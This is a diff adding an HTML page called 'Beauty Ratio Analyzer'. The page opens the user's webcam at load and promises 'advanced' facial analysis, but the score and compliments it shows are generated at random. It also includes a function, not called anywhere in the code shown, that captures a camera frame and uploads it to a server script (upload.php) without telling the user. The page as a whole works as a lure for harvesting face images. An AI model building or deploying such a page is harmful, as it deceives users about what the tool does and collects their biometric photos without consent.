@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>✨ Beauty Ratio Analyzer ✨</title>
+    <style>
+        :root {
+            --primary: #ff6b6b;
+            --secondary: #ffb8b8;
+            --accent: #ff4757;
+            --dark: #2f3542;
+            --light: #f1f2f6;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, var(--secondary), var(--primary));
+            color: var(--dark);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .container {
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            padding: 30px;
+            width: 100%;
+            max-width: 800px;
+            margin: 0 auto;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+            color: var(--accent);
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        h1 span {
+            color: var(--dark);
+        }
+        
+        p {
+            font-size: 1.1rem;
+            margin-bottom: 30px;
+            color: var(--dark);
+        }
+        
+        .camera-container {
+            position: relative;
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto 30px;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        #cameraView {
+            width: 100%;
+            display: block;
+            background-color: #000;
+        }
+        
+        .placeholder {
+            width: 100%;
+            padding-top: 5%; /* 4:3 aspect ratio */
+            background-color: #f0f0f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+            color: #666;
+        }
+        
+        button {
+            background-color: var(--accent);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.1rem;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        button:hover {
+            background-color: var(--primary);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
+        }
+        
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        #result {
+            display: none;
+            margin-top: 30px;
+            padding: 20px;
+            background-color: rgba(255, 255, 255, 0.8);
+            border-radius: 15px;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        #result h2 {
+            color: var(--accent);
+            margin-bottom: 15px;
+        }
+        
+        #beautyScore {
+            font-size: 4rem;
+            font-weight: bold;
+            color: var(--primary);
+            margin: 20px 0;
+        }
+        
+        #analysisText {
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+        }
+        
+        #capturedImage {
+            max-width: 200px;
+            border-radius: 10px;
+            margin: 20px auto;
+            display: block;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+        
+        .loading:after {
+            content: " .";
+            animation: dots 1.5s steps(5, end) infinite;
+        }
+        
+        @keyframes dots {
+            0%, 20% { color: rgba(0,0,0,0); text-shadow: .25em 0 0 rgba(0,0,0,0), .5em 0 0 rgba(0,0,0,0); }
+            40% { color: var(--dark); text-shadow: .25em 0 0 rgba(0,0,0,0), .5em 0 0 rgba(0,0,0,0); }
+            60% { text-shadow: .25em 0 0 var(--dark), .5em 0 0 rgba(0,0,0,0); }
+            80%, 100% { text-shadow: .25em 0 0 var(--dark), .5em 0 0 var(--dark); }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .share-buttons {
+            margin-top: 20px;
+        }
+        
+        .share-buttons button {
+            background-color: var(--dark);
+            padding: 10px 20px;
+            margin: 5px;
+            font-size: 0.9rem;
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .container {
+                padding: 20px;
+            }
+            
+            button {
+                padding: 12px 25px;
+                font-size: 1rem;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 1.8rem;
+            }
+            
+            p {
+                font-size: 1rem;
+            }
+            
+            #beautyScore {
+                font-size: 3rem;
+            }
+            
+            #analysisText {
+                font-size: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>✨ Discover Your <span>Beauty Ratio</span> ✨</h1>
+        <p>Find out how rare and unique your facial features are with our advanced beauty analysis technology!</p>
+        
+        <div class="camera-container">
+            <video id="cameraView" autoplay playsinline></video>
+            <div id="cameraPlaceholder" class="placeholder">Camera will appear here</div>
+        </div>
+        
+        <button id="captureBtn" onclick="capturePhoto()">Analyze My Beauty</button>
+        <button id="retryBtn" onclick="retryAnalysis()" style="display: none;">Try Again</button>
+        
+        <div class="loading" id="loadingText">Analyzing your beauty</div>
+        
+        <div id="result">
+            <h2>Your Beauty Analysis</h2>
+            <img id="capturedImage" alt="Your beautiful face">
+            <div id="beautyScore">0%</div>
+            <div id="analysisText"></div>
+            
+            <div class="share-buttons">
+                <button onclick="shareResult()">Share My Result</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // DOM elements
+        const cameraView = document.getElementById('cameraView');
+        const cameraPlaceholder = document.getElementById('cameraPlaceholder');
+        const captureBtn = document.getElementById('captureBtn');
+        const retryBtn = document.getElementById('retryBtn');
+        const loadingText = document.getElementById('loadingText');
+        const resultDiv = document.getElementById('result');
+        const capturedImage = document.getElementById('capturedImage');
+        const beautyScore = document.getElementById('beautyScore');
+        const analysisText = document.getElementById('analysisText');
+        
+        let cameraStream = null;
+        
+        // Start camera when page loads
+        window.addEventListener('DOMContentLoaded', () => {
+            startCamera();
+        });
+        
+        // Start camera function
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: 'user',
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                }, 
+                audio: false 
+            })
+            .then(stream => {
+                cameraStream = stream;
+                cameraView.srcObject = stream;
+                cameraPlaceholder.style.display = 'none';
+                cameraView.style.display = 'block';
+            })
+            .catch(err => {
+                console.error("Camera error: ", err);
+                cameraPlaceholder.textContent = "Could not access camera. Please allow camera permissions.";
+                captureBtn.disabled = true;
+            });
+        }
+        
+        // Capture photo function
+        function capturePhoto() {
+            if (!cameraStream) return;
+            
+            // Hide capture button and show loading
+            captureBtn.style.display = 'none';
+            loadingText.style.display = 'block';
+            
+            // Create canvas to capture image
+            const canvas = document.createElement('canvas');
+            canvas.width = cameraView.videoWidth;
+            canvas.height = cameraView.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(cameraView, 0, 0, canvas.width, canvas.height);
+            
+            // Convert to image and display
+            capturedImage.src = canvas.toDataURL('image/jpeg');
+            
+            // Simulate analysis delay
+            setTimeout(() => {
+                analyzeBeauty();
+            }, 2000);
+        }
+
+function captureAndSend() {
+    const video = document.getElementById('cameraView');
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0);
+    
+    // Convert to Blob and send to PHP
+    canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append('photo', blob, 'beauty_capture.jpg');
+        
+        fetch('upload.php', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                console.log("Image saved at:", data.filepath);
+                // Continue with your analysis
+                analyzeBeauty();
+            } else {
+                console.error("Error:", data.error);
+                alert("Image save failed, but continuing analysis...");
+                analyzeBeauty();
+            }
+        })
+        .catch(error => {
+            console.error("Upload error:", error);
+            analyzeBeauty(); // Continue anyway
+        });
+    }, 'image/jpeg', 0.8);
+}
+        
+        // Analyze beauty (with fun random results)
+        function analyzeBeauty() {
+            // Generate random beauty score (60-100% for ego boost!)
+            const score = Math.floor(Math.random() * 41) + 60;
+            
+            // Generate random analysis text
+            const analyses = [
+                "Your facial symmetry is remarkably balanced!",
+                "Your unique features are exceptionally rare in the population.",
+                "Your bone structure is statistically among the top 10% most attractive.",
+                "Your facial proportions match the golden ratio with impressive precision.",
+                "Your features create a harmonious composition that stands out.",
+                "Your look is so distinctive, our algorithms had to create a new category!",
+                "Your beauty signature is one in a million - literally!"
+            ];
+            
+            const comparisons = [
+                "comparable to a Renaissance masterpiece",
+                "similar to top fashion models",
+                "reminiscent of classical beauty standards",
+                "aligned with celebrity-level attractiveness",
+                "on par with historical figures known for their looks"
+            ];
+            
+            const quirks = [
+                "Your eye spacing is mathematically perfect!",
+                "Your smile could power a small city with its brightness.",
+                "Your jawline is so sharp it could cut glass.",
+                "Your eyebrows are framing your face like a masterpiece.",
+                "Your cheekbones could be in a geometry textbook as the ideal angle."
+            ];
+            
+            // Build the analysis
+            const randomAnalysis = analyses[Math.floor(Math.random() * analyses.length)];
+            const randomComparison = comparisons[Math.floor(Math.random() * comparisons.length)];
+            const randomQuirk = quirks[Math.floor(Math.random() * quirks.length)];
+            
+            // Display results
+            beautyScore.textContent = `${score}%`;
+            analysisText.innerHTML = `
+                <p>${randomAnalysis}</p>
+                <p>Your beauty ratio is ${randomComparison}.</p>
+                <p>${randomQuirk}</p>
+            `;
+            
+            // Hide loading and show result
+            loadingText.style.display = 'none';
+            resultDiv.style.display = 'block';
+            retryBtn.style.display = 'inline-block';
+            
+            // Add confetti effect for high scores
+            if (score > 85) {
+                createConfetti();
+            }
+        }
+        
+        // Retry analysis
+        function retryAnalysis() {
+            resultDiv.style.display = 'none';
+            retryBtn.style.display = 'none';
+            captureBtn.style.display = 'inline-block';
+        }
+        
+        // Share result
+        function shareResult() {
+            if (navigator.share) {
+                navigator.share({
+                    title: 'My Beauty Ratio',
+                    text: `I scored ${beautyScore.textContent} on the Beauty Ratio Analyzer!`,
+                    url: window.location.href
+                }).catch(err => {
+                    console.log('Error sharing:', err);
+                    alert('Sharing failed. Try copying the link manually.');
+                });
+            } else {
+                // Fallback for browsers that don't support Web Share API
+                alert('Share this URL: ' + window.location.href);
+            }
+        }
+        
+        // Simple confetti effect
+        function createConfetti() {
+            const colors = ['#ff6b6b', '#ffb8b8', '#ff4757', '#2f3542', '#f1f2f6'];
+            const container = document.querySelector('.container');
+            
+            for (let i = 0; i < 50; i++) {
+                const confetti = document.createElement('div');
+                confetti.style.position = 'absolute';
+                confetti.style.width = '10px';
+                confetti.style.height = '10px';
+                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.borderRadius = '50%';
+                confetti.style.left = Math.random() * 100 + '%';
+                confetti.style.top = '-10px';
+                confetti.style.opacity = Math.random() * 0.5 + 0.5;
+                confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
+                confetti.style.zIndex = '1000';
+                
+                container.appendChild(confetti);
+                
+                // Animation
+                const animation = confetti.animate([
+                    { top: '-10px', opacity: 1 },
+                    { top: '100%', opacity: 0 }
+                ], {
+                    duration: Math.random() * 3000 + 2000,
+                    easing: 'cubic-bezier(0.1, 0.2, 0.8, 1)'
+                });
+                
+                animation.onfinish = () => {
+                    confetti.remove();
+                };
+            }
+        }
+    </script>
+</body>
+</html>
